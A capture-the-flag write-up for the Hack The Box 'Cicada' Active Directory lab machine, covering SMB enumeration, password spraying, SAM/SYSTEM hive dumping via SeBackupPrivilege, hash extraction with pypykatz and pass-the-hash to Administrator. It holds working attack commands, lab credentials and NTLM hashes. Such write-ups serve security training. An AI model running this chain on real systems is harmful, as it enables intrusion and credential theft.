---
{"dg-publish":true,"permalink":"/cyber-knowledgebase/misc-writeups/htb-writeups/cicada/","tags":["#ActiveDirectory","#SMB","#NXC","WinRM","PassTheHash","SeBackupPrivilege","PyPyKatz"]}
---


# 10.10.11.35
Simple Active Directory box focused around enumeration and basic privesc technique based on SeBackupPrivilege
## Recon
```bash
PORT STATE SERVICE 
53/tcp open domain 
88/tcp open kerberos-sec 
135/tcp open msrpc 
139/tcp open netbios-ssn 
389/tcp open ldap 
445/tcp open microsoft-ds 
464/tcp open kpasswd5 
593/tcp open http-rpc-epmap 
636/tcp open ldapssl 
3268/tcp open globalcatLDAP 
3269/tcp open globalcatLDAPssl 
5985/tcp open wsman 
54296/tcp open unknown
```

- lots of open ports, looks like active directory
- HR share, dev share
- dev share needs a user
- hr is wide open
	- interal doc in HR share says default passwd for new accounts is: `Cicada$M6Corpb*@Lp#nZp!8`


### USERS
`nxc smb 10.10.11.35 -u 'a' -p '' --rid-brute`

```bash
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

seems like michael.wrightson didn't change his default password:
`nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`

```bash
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
```

### SHARES
`nxc smb 10.10.11.35 -u '' -p '' --shares`
- get shares for guest
- try the same thing again supplying creds found from user enum
- **download shares**
`nxc smb 10.10.11.35 --shares -u david.orelious -p 'aRt$Lp#7t*VQ!3' -M spider_plus -o DOWNLOAD_FLAG=True`

- Backup_script.ps1 in the dev share has creds for emily.oscars


#### CREDS
`michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
`david.orelious:aRt$Lp#7t*VQ!3`
`emily.oscars:Q!3@Lp#M6b*7t*Vt`

see if we can get a shell with anyone yet:
`nxc winrm 10.10.11.35 -u users.txt -p passwords.txt`

```bash
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrightson:aRt$Lp#7t*VQ!3
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\emily.oscars:aRt$Lp#7t*VQ!3
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Q!3@Lp#M6b*7t*Vt
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\david.orelious:Q!3@Lp#M6b*7t*Vt
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

emily is the lucky winner


## FOOTHOLD

user.txt is on emily's desktop

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

## Escalation
so we can save the registry hives and exfiltrate them:
`reg save hklm\sam C:\temp\sam.hive`
`reg save hklm\system C:\temp\system.hive`

```powershell
*Evil-WinRM* PS C:\temp> download sam.hive
                                        
Info: Downloading C:\temp\sam.hive to sam.hive
                                        
Info: Download successful!
```
```powershell
*Evil-WinRM* PS C:\temp> download system.hive
                                        
Info: Downloading C:\temp\system.hive to system.hive
                                        
Info: Download successful!

```
we can use secretsdump or pypykatz, but I wanted to try pypykatz:
`pypykatz registry --sam sam.hive system.hive`

```bash
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

looks like it worked
admin hash is the last part, not the whole or first part: `2b87e7c93a3e8a0ea4a581937016f341`

just pass the admin hash via winrm:
`evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341`

root.txt is on admin desktop
